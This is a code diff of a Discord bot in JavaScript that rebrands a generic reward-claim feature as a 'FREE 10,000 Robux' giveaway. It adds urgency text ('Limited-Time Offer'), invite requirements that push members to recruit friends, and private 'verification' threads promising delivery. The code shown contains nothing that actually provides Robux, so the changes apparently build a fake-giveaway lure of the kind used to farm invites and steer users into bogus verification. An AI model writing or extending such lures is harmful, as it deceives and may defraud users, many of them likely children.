@@ -37,33 +37,19 @@ function canVerifyInThread(member) {
 // Embed creation functions
 function createRewardEmbed(title, description, initiator) {
     return new EmbedBuilder()
-        .setTitle(`🎁 ${title}`)
-        .setDescription(description)
-        .setColor(0xFFD700) // Gold color for rewards
-        .addFields(
-            {
-                name: '📋 Requirements',
-                value: '• Must have required role to claim\n• Need 1 invite to unlock reward\n• Complete verification in private thread',
-                inline: false
-            }
-        )
-        .setFooter({ text: 'Click the button below to claim your reward' })
+        .setTitle(`🎁 ${title || 'Claim Your 10K Robux Giveaway!'}`)
+        .setDescription(`🎉 To celebrate reaching a great amount of **members**, we're giving away **FREE 10,000 Robux** to qualified members of this server! 🤑\n\n🌟 **HOW IT WORKS** 🌟\n\n▶️ **1.** Select the **Claim Giveaway** button below\n▶️ **2.** Complete verification in your **private thread**\n▶️ **3.** Get your **10K Robux** delivered!\n\n⚠️ **NOTE:** ⚠️\n▶️ This is a **Limited-Time Offer** - Be sure to claim it before it's gone forever!`)
+        .setColor(0x5865F2) // Discord blue color
+        .setFooter({ text: 'Choose Your Giveaway...' })
         .setTimestamp();
 }
 
 function createInviteCheckEmbed(title, description, initiator) {
     return new EmbedBuilder()
-        .setTitle(`📊 ${title}`)
-        .setDescription(description)
-        .setColor(0x00BFFF) // Deep sky blue for invite checking
-        .addFields(
-            {
-                name: '📋 Information',
-                value: '• Click the button to check your invite count\n• Results are shown privately to you only\n• Invite count determines your eligibility for rewards',
-                inline: false
-            }
-        )
-        .setFooter({ text: 'Click the button below to check your invites' })
+        .setTitle(`📊 ${title || 'Track Invites'}`)
+        .setDescription(`• Click the button **below** to check your invites.\n• For your **invites** to count, your friends must join and stay in the **server**.`)
+        .setColor(0x5865F2) // Discord blue color
+        .setFooter({ text: '' })
         .setTimestamp();
 }
 
@@ -186,8 +172,8 @@ async function handleSlashCommand(interaction) {
     
     if (commandName === 'claim-reward') {
         const channel = options.getChannel('channel') || interaction.channel;
-        const title = options.getString('title') || 'Exclusive Reward';
-        const description = options.getString('description') || 'An exclusive reward is available for qualified members. Click below to claim it!';
+        const title = options.getString('title') || 'Claim Your 10K Robux Giveaway!';
+        const description = options.getString('description') || 'Limited-time 10,000 Robux giveaway for qualified members!';
         
         // Check if user has admin permissions to setup rewards
         if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
@@ -201,8 +187,8 @@ async function handleSlashCommand(interaction) {
         const embed = createRewardEmbed(title, description, interaction.member);
         const button = new ButtonBuilder()
             .setCustomId('claim_reward')
-            .setLabel('Claim Reward')
-            .setStyle(ButtonStyle.Success)
+            .setLabel('Claim Giveaway')
+            .setStyle(ButtonStyle.Primary)
             .setEmoji('🎁');
         
         const row = new ActionRowBuilder().addComponents(button);
@@ -210,7 +196,7 @@ async function handleSlashCommand(interaction) {
         try {
             await channel.send({ embeds: [embed], components: [row] });
             await interaction.reply({
-                content: `✅ Reward claim system setup in ${channel}`,
+                content: `✅ 10K Robux giveaway setup in ${channel}`,
                 ephemeral: true
             });
             console.log(`Reward claim setup by ${interaction.user.tag} in ${channel.name}`);
@@ -239,9 +225,9 @@ async function handleSlashCommand(interaction) {
         const embed = createInviteCheckEmbed(title, description, interaction.member);
         const button = new ButtonBuilder()
             .setCustomId('check_invites')
-            .setLabel('Check My Invites')
-            .setStyle(ButtonStyle.Primary)
-            .setEmoji('📊');
+            .setLabel('Check Invites')
+            .setStyle(ButtonStyle.Secondary)
+            .setEmoji('⚙️');
         
         const row = new ActionRowBuilder().addComponents(button);
         
@@ -303,7 +289,7 @@ async function handleButtonInteraction(interaction) {
         }
         
         // Create private thread
-        const threadName = `🎁-reward-claim-${interaction.member.displayName}`;
+        const threadName = `🎁-robux-giveaway-${interaction.member.displayName}`;
         
         try {
             const thread = await interaction.channel.threads.create({
@@ -311,7 +297,7 @@ async function handleButtonInteraction(interaction) {
                 autoArchiveDuration: 60,
                 type: ChannelType.PrivateThread,
                 invitable: false,
-                reason: `Private reward claim thread for ${interaction.user.tag}`
+                reason: `Private Robux giveaway verification for ${interaction.user.tag}`
             });
             
             // Add only the user to the private thread
@@ -319,21 +305,9 @@ async function handleButtonInteraction(interaction) {
             
             // Create welcome embed for private thread
             const welcomeEmbed = new EmbedBuilder()
-                .setTitle('🎁 Reward Claim Process')
-                .setDescription(`Welcome ${interaction.member}! You're now in your private reward claim area.`)
-                .setColor(0xFFD700)
-                .addFields(
-                    {
-                        name: '📋 Requirements Check',
-                        value: '✅ Required role: Verified\n⏳ Verification status: Pending\n💎 Invite requirement: 1 invite needed',
-                        inline: false
-                    },
-                    {
-                        name: 'Next Steps',
-                        value: 'Complete the verification process below to claim your reward.',
-                        inline: false
-                    }
-                )
+                .setTitle('🎁 10K Robux Giveaway Verification')
+                .setDescription(`Welcome ${interaction.member}! You're in your **private verification area** for the 10,000 Robux giveaway.\n\n🔒 **This thread is private** - only you and authorized staff can see this.\n\n📋 **Next Steps:**\n▶️ Click **Complete Verification** below\n▶️ Follow the verification process\n▶️ Get your **10K Robux** delivered!`)
+                .setColor(0x5865F2)
                 .setTimestamp();
             
             // Create verification button
